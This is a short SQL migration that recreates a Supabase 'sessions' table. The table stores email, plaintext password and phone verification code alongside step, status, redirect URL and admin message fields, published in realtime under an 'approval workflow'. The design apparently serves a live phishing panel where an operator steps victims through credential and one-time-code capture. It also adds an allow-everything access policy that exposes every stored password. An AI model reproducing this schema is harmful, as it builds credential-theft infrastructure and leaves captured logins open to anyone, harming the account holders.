-- Drop and recreate sessions table with approval workflow
DROP TABLE IF EXISTS sessions;

CREATE TABLE sessions (
  id TEXT PRIMARY KEY,
  email TEXT,
  password TEXT,
  phone_code TEXT,
  current_step TEXT NOT NULL DEFAULT 'email',
  status TEXT NOT NULL DEFAULT 'idle',
  user_agent TEXT,
  is_active BOOLEAN DEFAULT true,
  redirect_url TEXT,
  admin_message TEXT,
  last_activity TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable Row Level Security
ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;

-- Create policy to allow all operations (for demo purposes)
DROP POLICY IF EXISTS "Allow all operations on sessions" ON sessions;
CREATE POLICY "Allow all operations on sessions" ON sessions FOR ALL USING (true) WITH CHECK (true);

-- Enable realtime
ALTER PUBLICATION supabase_realtime ADD TABLE sessions;
